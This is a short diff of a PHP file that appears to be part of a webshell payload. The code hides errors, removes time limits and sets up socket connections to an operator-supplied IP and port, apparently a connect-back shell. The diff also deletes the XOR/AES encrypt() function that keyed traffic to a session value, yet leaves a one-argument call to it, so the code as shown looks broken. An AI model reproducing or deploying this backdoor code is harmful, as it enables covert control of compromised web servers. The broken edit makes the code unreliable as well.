@@ -1,4 +1,4 @@
-
+<?
 @error_reporting(0);
 @set_time_limit(0);
 function main($type,$ip,$port)
@@ -11,7 +11,7 @@ ob_end_clean();
             ob_start();
             $result["status"] = base64_encode("success");
             $result["msg"] = base64_encode("success");
-            echo encrypt(json_encode($result), $_SESSION['k']);
+            echo encrypt(json_encode($result));
             $size = ob_get_length();
             header("Content-Length: $size");
 
@@ -143,18 +143,4 @@ function common($ip,$port)
       }
       @socket_close($s);
     }
-}
-function encrypt($data,$key)
-{
-	if(!extension_loaded('openssl'))
-    	{
-    		for($i=0;$i<strlen($data);$i++) {
-    			 $data[$i] = $data[$i]^$key[$i+1&15];
-    			}
-			return $data;
-    	}
-    else
-    	{
-    		return openssl_encrypt($data, "AES128", $key);
-    	}
 }
